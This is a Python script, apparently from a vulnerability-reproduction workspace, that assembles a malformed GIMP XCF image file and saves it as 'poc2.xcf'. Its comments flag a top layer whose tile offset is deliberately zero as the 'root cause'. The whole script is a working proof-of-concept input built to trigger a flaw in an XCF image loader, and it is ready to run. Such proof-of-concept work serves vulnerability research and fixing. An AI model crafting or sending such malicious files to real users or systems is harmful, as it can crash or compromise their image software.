from pathlib import Path
import struct
buf=bytearray()
def u32(x): buf.extend(struct.pack('>I', x & 0xffffffff))
def bytes_(b): buf.extend(b)
def prop(t,p=b''):
    u32(t); u32(len(p)); bytes_(p)
# header
bytes_(b'gimp xcf file\0')
u32(32); u32(32); u32(2)  # INDEXED image
# image props: compression RLE, colormap 2, end
prop(17, b'\x01')
# colormap: file says size but loader recalculates; payload includes ncolors + RGB triples
prop(1, struct.pack('>I',2)+bytes([0,0,0,255,255,255]))
prop(0)
# reserve layer offsets top,bottom,0
layer_list_pos=len(buf); u32(0); u32(0); u32(0)
# helper layer records
def layer_record(layer_type, hierarchy_offset, name=b'L\0'):
    start=len(buf)
    u32(32); u32(32); u32(layer_type)
    u32(len(name)); bytes_(name)
    prop(0)
    u32(hierarchy_offset); u32(0)
    return start
# Need know hierarchy offsets before writing layers. We'll reserve by writing top layer with placeholder then bottom placeholder.
top_layer_pos=len(buf); top_hier_placeholder_pos=None
# create top layer placeholder
u32(32); u32(32); u32(0); u32(4); bytes_(b'Top\0'); prop(0); top_hier_field=len(buf); u32(0); u32(0)
bottom_layer_pos=len(buf)
u32(32); u32(32); u32(4); u32(7); bytes_(b'Bottom\0'); prop(0); bottom_hier_field=len(buf); u32(0); u32(0)
# top hierarchy with level whose tile offset is zero
top_hier=len(buf)
u32(32); u32(32); u32(3); top_level_pos_placeholder=len(buf); u32(0); u32(0)
top_level=len(buf)
u32(32); u32(32); u32(0)  # root cause: offset zero
# bottom hierarchy and valid bottom tile
bottom_hier=len(buf)
u32(32); u32(32); u32(1); bottom_level_placeholder=len(buf); u32(0); u32(0)
bottom_level=len(buf)
# level header, tile offset, next offset
u32(32); u32(32); bottom_tile_offset_field=len(buf); u32(0); bottom_tile2_field=len(buf); u32(0)
bottom_tile=len(buf)
# RLE 1024 zeros in chunks of 128 repeated: val 127, byte 0, eight times
bytes_(b''.join([bytes([127,0]) for _ in range(8)]))
bottom_tile2=len(buf)
# patch offsets
def put32(pos,val): buf[pos:pos+4]=struct.pack('>I',val)
put32(layer_list_pos, top_layer_pos); put32(layer_list_pos+4, bottom_layer_pos)
put32(top_hier_field, top_hier); put32(bottom_hier_field, bottom_hier)
put32(top_level_pos_placeholder, top_level); put32(bottom_level_placeholder, bottom_level)
put32(bottom_tile_offset_field, bottom_tile); put32(bottom_tile2_field, bottom_tile2)
Path('/workspace/poc2.xcf').write_bytes(buf)
print('len',len(buf),'top_layer',top_layer_pos,'bottom_layer',bottom_layer_pos,'top_hier',top_hier,'top_level',top_level,'bottom_hier',bottom_hier,'bottom_level',bottom_level,'tile',bottom_tile,bottom_tile2)
print(buf[:120].hex())
